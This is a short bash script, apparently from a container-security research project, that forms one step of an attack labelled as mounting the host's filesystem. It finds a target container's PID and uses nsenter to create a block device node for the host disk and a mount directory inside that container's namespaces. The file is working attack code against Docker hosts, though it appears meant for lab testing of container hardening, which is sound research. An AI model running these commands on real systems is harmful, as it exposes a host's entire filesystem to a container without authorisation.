#!/bin/bash

#Attacking directory where attacker's scripts are
attack="/home/ubuntu/SecureWilly/Attacks/Nsenter/Mount_hosts_filesystem"

#List all running containers and keep the one including the name attacked_nsenter
docker ps | grep attacked_nsenter > dockerps
#Keep the container's id
cut -d' ' -f1 dockerps > containerid
container_id=$(cat containerid)
#Find the pid of the container's process
docker inspect --format {{.State.Pid}} ${container_id} > PID
container_pid=$(cat PID)

#Files from script 3_attack_to_host.sh
major=$(cat major_num)
minor=$(cat minor_num)
dev="/dev/$(cat sdev_of_fs)"

#Done by attacker inside host
#Attack the container using nsenter
#Create a special device
nsenter --target ${container_pid} --mount --pid mknod --mode 0600 ${dev} b ${major} ${minor}
#Create a directory - /tmpmount
nsenter --target ${container_pid} --mount --pid mkdir -p /tmpmount
